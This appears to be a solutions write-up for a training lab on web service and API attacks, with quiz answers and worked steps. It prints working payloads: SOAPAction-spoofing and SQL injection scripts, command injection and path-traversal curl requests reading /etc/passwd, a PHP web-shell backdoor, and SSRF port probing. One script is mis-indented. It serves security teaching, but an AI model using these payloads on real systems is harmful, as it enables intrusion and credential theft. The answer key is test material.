
| Section | Question Number | Answer |
| --- | --- | --- |
| Web Services Description Language (WSDL) | Question 1 | Method |
| SOAPAction Spoofing | Question 1 | x86\_64 |
| Command Injection | Question 1 | root |
| Command Injection | Question 2 | URL Encoding |
| Information Disclosure (with a twist of SQLi) | Question 1 | WebServices |
| Information Disclosure (with a twist of SQLi) | Question 2 | HTB{THE\_FL4G\_FOR\_SQLI\_IS\_H3RE} |
| Arbitrary File Upload | Question 1 | nix01-websvc |
| Local File Inclusion (LFI) | Question 1 | ubuntu |
| Cross-Site Scripting | Question 1 | No |
| Server-Side Request Forgery (SSRF) | Question 1 | Yes |
| Regular Expression Denial of Service (ReDoS) | Question 1 | Yes |
| XML External Entity (XXE) Injection | Question 1 | file |
| Web Service & API Attacks - Skills Assessment | Question 1 | FLAG{1337\_SQL\_INJECTION\_IS\_FUN\_:)} |

## Acronyms Used in Writeups

| Acronym | Meaning |
| --- | --- |
| STMIP | Spawned Target Machine IP Address |
| STMPO | Spawned Target Machine Port |
| PMVPN | Personal Machine with a Connection to the Academy's VPN |
| PWNIP | Pwnbox IP Address (or PMVPN IP Address) |
| PWNPO | Pwnbox Port (or PMVPN Port) |

# Web Services Description Language (WSDL)

## Question 1

### "If you should think of the operation object in WSDL as a programming concept, which of the following is closer in terms of the provided functionality? Answer options (without quotation marks): "Data Structure", "Method", "Class""

`Operation` in WSDL defines the available SOAP actions alongside the encoding of each message. Out of the three options, `Method` is closer to `operation` as it includes the remote invocation concept. In addition, `Data Structure` and `Class` allow for custom implementation but `Operation` does not.

Answer: `Method`

# SOAPAction Spoofing

## Question 1

### "Exploit the SOAPAction spoofing vulnerability and submit the architecture of the web server as your answer. Answer options (without quotation marks): "x86\_64", "x86""

After spawning the target machine, students need to use the "automate.py" script provided at the end of the section, changing "<TARGET IP>" with `STMIP`:

Code: python

```python
import requests

while True:
    cmd = input("$ ")
payload = f'<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  xmlns:tns="http://tempuri.org/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/"><soap:Body><LoginRequest xmlns="http://tempuri.org/"><cmd>{cmd}</cmd></LoginRequest></soap:Body></soap:Envelope>'
    print(requests.post("http://STMIP:3002/wsdl", data=payload, headers={"SOAPAction":'"ExecuteCommand"'}).content)
```

Students then need to run the script and issue the `uname` command with the `-i` (short version of `--hardware-information`) option:

Code: shell

```shell
python3 automate.py
uname -i
```

```
┌─[us-academy-1]─[10.10.14.135]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ python3 automate.py

$ uname -i
b'<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope
	xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"
	xmlns:tns="http://tempuri.org/"
	xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/">
	<soap:Body>
		<LoginResponse
			xmlns="http://tempuri.org/">
			<success>true</success>
			<result>x86_64\n</result>
		</LoginResponse>
	</soap:Body>
</soap:Envelope>'
```

From the output, students will know that the architecture of the web server is `x86_64`.

Answer: `x86_64`

# Command Injection

## Question 1

### "Exploit the command injection vulnerability of the target to execute an "id" command. Submit the privileges under which the server is running as your answer. Answer options (without quotation marks): "user", "www-data", "root""

After spawning the target machine, students need to exploit the command injection vulnerability and execute the `id` command:

Code: shell

```shell
curl -s http://STMIP:3003/ping-server.php/system/id
```

```
┌─[us-academy-1]─[10.10.14.135]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ curl -s http://10.129.144.205:3003/ping-server.php/system/id

uid=0(root) gid=0(root) groups=0(root)
```

Answer: `root`

# Command Injection

## Question 2

### "To execute commands featuring arguments via http://<TARGET IP>:3003/ping-server.php/system/{cmd} you may have to use \_\_\_\_\_\_. Answer options (without quotation marks): "Encryption", "Hashing", "URL Encoding""

`URL Encoding` may need to be used, because for example, the following command injection payload will not work:

Code: shell

```shell
curl http://STMIP:3003/ping-server.php/system/cd .. && ls
```

```
┌─[us-academy-1]─[10.10.14.50]─[htb-ac413848@htb-q7l0dpr4ul]─[~]
└──╼ [★]$ curl http://10.129.202.133:3003/ping-server.php/system/cd .. && ls

curl: (6) Could not resolve host: ..
```

However, when URL encoding it, the payload works successfully:

Code: shell

```shell
curl http://STMIP:3003/ping-server.php/system/cd%20..%20%26%26%20ls
```

```
┌─[us-academy-1]─[10.10.14.50]─[htb-ac413848@htb-q7l0dpr4ul]─[~]
└──╼ [★]$ curl http://10.129.202.133:3003/ping-server.php/system/cd%20..%20%26%26%20ls
nodejs

php
php-sqli
soap-wsdl
```

Answer: `URL Encoding`

# Information Disclosure (with a twist of SQLi)

## Question 1

### "What is the username of the third user (id=3)?"

After spawning the target machine, students need to use `cURL` to invoke a request for `id` number 3 to find its username:

Code: shell

```shell
curl -s -w "\n" http://STMIP:3003/?id=3
```

```
┌─[us-academy-1]─[10.10.14.135]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ curl -s -w "\n" http://10.129.144.205:3003/?id=3

[{"id":"3","username":"WebServices","position":"3"}]
```

Answer: `WebServices`

# Information Disclosure (with a twist of SQLi)

## Question 2

### "Identify the username of the user that has a position of 736373 through SQLi. Submit it as your answer."

Students need to use any SQLi payload such as `'OR 1=1' OR 1` and URL encode it to attain the flag `HTB{THE_FL4G_FOR_SQLI_IS_H3RE}`:

Code: shell

```shell
curl -s -w "\n" http://STMIP:3003/?id=%27OR%201%3D1%27%20OR%201 | jq
```

```
┌─[us-academy-1]─[10.10.14.135]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ curl -s -w "\n" http://10.129.202.133:3003/?id=%27OR%201%3D1%27%20OR%201 | jq
[

<SNIP>

  {
    "id": "8374932",
    "username": "HTB{THE_FL4G_FOR_SQLI_IS_H3RE}",
    "position": "736373"
  }
]
```

Answer: `HTB{THE_FL4G_FOR_SQLI_IS_H3RE}`

# Arbitrary File Upload

## Question 1

### "Achieve remote code execution and submit the server's hostname as your answer."

After spawning the target machine, students need to save the PHP backdoor to a file and then upload it at the "Login" page:

Code: php

```php
<?php if(isset($_REQUEST['cmd'])){ $cmd = ($_REQUEST['cmd']); system($cmd); die; }?>
```

![[HTB Solutions/CBBH/z. images/d9237623f84e3bd94759aa89155f5c44_MD5.jpg]]

Then, students will get an upload success confirmation page:

![[HTB Solutions/CBBH/z. images/3b4d4cb6c9b964c4712b1571517209b4_MD5.jpg]]

Students can either use the `cmd` URL parameter directly or the Python script provided in the module's section. To use the URL parameter directly, students need to supply the `hostname` command for the `cmd` parameter:

Code: shell

```shell
curl -s -w "\n" http://STMIP:3001/uploads/backdoor.php?cmd=hostname
```

```
┌─[us-academy-1]─[10.10.14.135]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ curl -s -w "\n" http://10.129.183.189:3001/uploads/backdoor.php?cmd=hostname

nix01-websvc
```

Alternatively, students can use the Python script provided in the section after saving it to a file:

Code: shell

```shell
python3 webShell.py -t http://STMIP:3001/uploads/backdoor.php -o yes
hostname
```

```
┌─[us-academy-1]─[10.10.14.135]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ python3 webShell.py -t http://10.129.147.235:3001/uploads/backdoor.php -o yes

$ hostname

nix01-websvc
```

Answer: `nix01-websvc`

# Local File Inclusion (LFI)

## Question 1

### "Through the LFI vulnerability identify an existing user on the server whose name starts with "ub". Answer format: ub\*\*\*\*"

After spawning the target machine, students need to use an LFI payload that will read the `/etc/passwd` file:

Code: shell

```shell
curl -s "http://STMIP:3000/api/download/..%2f..%2f..%2f..%2fetc%2fpasswd" | grep "ub.*"
```

```
┌─[us-academy-1]─[10.10.14.135]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ curl -s "http://10.129.163.78:3000/api/download/..%2f..%2f..%2f..%2fetc%2fpasswd" | grep "ub.*"

ubuntu:x:1000:1000::/home/ubuntu:/bin/shell-session
```

Answer: `ubuntu`

# Cross-Site Scripting (XSS)

## Question 1

### "If we URL-encoded our payload twice, would it still work? Answer format: Yes, No"

`No`; double URL encoding will break the payload.

Answer: `No`

# Server-Side Request Forgery (SSRF)

## Question 1

### "Can you leverage the SSRF vulnerability to identify port 3002 listening locally on the web server? Answer format: Yes, No"

Students can leverage the SSRF vulnerability to identify that port 3002 is listening locally on the web server. To do so, students first need to Base64-encode `http://127.0.0.1:3002` so that they can use it as the value for the `id` URL parameter:

Code: shell

```shell
echo "http://127.0.0.1:3002" | tr -d '\n' | base64
```

```
┌─[us-academy-1]─[10.10.14.135]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ echo "http://127.0.0.1:3002" | tr -d '\n' | base64

aHR0cDovLzEyNy4wLjAuMTozMDAy
```

Students then need to use `cURL` to check the total time that it would take for the request that specifies port 3002:

```shell
curl -s -w 'Total Time: %{time_total}s\n' "http://STMIP:3000/api/userinfo?id=aHR0cDovLzEyNy4wLjAuMTozMDAy"
```
```
┌─[us-academy-1]─[10.10.14.135]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ curl -s -w 'Total Time: %{time_total}s\n' "http://10.129.144.240:3000/api/userinfo?id=aHR0cDovLzEyNy4wLjAuMTozMDAy"

Total Time: 18.372783s
```

Since it takes considerably large amount of time (18 seconds), the port must be open and listening as some communications/processes are taking place. Students can be assured by trying to send a request for a port that is probably not open, for example, port 8888:

```shell
echo "http://127.0.0.1:8888" | tr -d '\n' | base64
```
```
┌─[us-academy-1]─[10.10.14.135]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ echo "http://127.0.0.1:8888" | tr -d '\n' | base64

aHR0cDovLzEyNy4wLjAuMTo4ODg4
```

Then, using `cURL` shows that the requests takes only 3 seconds, thus it must be closed due to how short the total time of the request is:

```shell
curl -s -w 'Total Time: %{time_total}s\n' "http://STMIP:3000/api/userinfo?id=aHR0cDovLzEyNy4wLjAuMTo4ODg4"
```
```
┌─[us-academy-1]─[10.10.14.135]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ curl -s -w 'Total Time: %{time_total}s\n' "http://10.129.144.240:3000/api/userinfo?id=aHR0cDovLzEyNy4wLjAuMTo4ODg4"

Total Time: 3.133078s
```

Answer: `Yes`

# Regular Expression Denial of Service (ReDoS)

## Question 1

### "There are more than one payload lengths to exploit/trigger the ReDoS vulnerability. Answer format: Yes, No"

`Yes`; there are multiple payloads of different lengths that can trigger a ReDoS vulnerability.

Answer: `Yes`

# XML External Entity (XXE) Injection

## Question 1

### "What URI scheme should you specify inside an entity to retrieve the content of an internal file? Answer options (without quotation marks): "http", "https", "data", "file""

The `file` URI scheme should be specified in an entity to retrieve the contents of an internal file.

Answer: `file`

# Web Service & API Attacks - Skills Assessment

## Question 1

### "Submit the password of the user that has a username of "admin". Answer format: FLAG{string}. Please note that the service will respond successfully only after submitting the proper SQLi payload, otherwise it will hang or throw an error."

After spawning the target machine, students need to inspect the WSDL file of the SOAP service that resides in `http://STMIP:3002/wsdl?wsdl`, to find that there is a SOAPAction called `LoginRequest` with two parameters, `username` and `password`:

![[HTB Solutions/CBBH/z. images/853423e43ac3b7b356920e285be3a6e9_MD5.jpg]]

Thus, students need to specify `LoginRequest` within `<soap:Body>`, provide a SQLi that will allow users to login as `admin`, such as `admin' --` as the value for the `<username>` parameter, and provide any dummy password as value for the `<password>` parameter. Students need to use the following Python script to trigger the SQLi vulnerability of the service and reveal the flag `FLAG{1337_SQL_INJECTION_IS_FUN_:)}`:

```python
import requests

payload = "admin' --"
data = f'<?xml version="1.0" encoding="UTF-8"?> <soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/" xmlns:tns="http://tempuri.org/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"> <soap:Body> <LoginRequest xmlns="http://tempuri.org/"> <username>{payload}</username> <password>fff</password> </LoginRequest> </soap:Body> </soap:Envelope>'

print(requests.post("http://STMIP:3002/wsdl", data=data, headers={"SOAPAction":'"Login"'}).content)
```
```shell
python3 sqli.py
```
```
┌─[us-academy-1]─[10.10.14.50]─[htb-ac413848@htb-q7l0dpr4ul]─[~]
└──╼ [★]$ python3 sqli.py

b'<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope
	xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"
	xmlns:tns="http://tempuri.org/"
	xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/">
	<soap:Body>
		<LoginResponse
			xmlns="http://tempuri.org/">
			<id>0</id>
			<name>Administrator</name>
			<email>admin@htb.net</email>
			<username>admin</username>
			<password>FLAG{1337_SQL_INJECTION_IS_FUN_:)}</password>
		</LoginResponse>
	</soap:Body>
</soap:Envelope>'
```

Answer: `FLAG{1337_SQL_INJECTION_IS_FUN_:)}`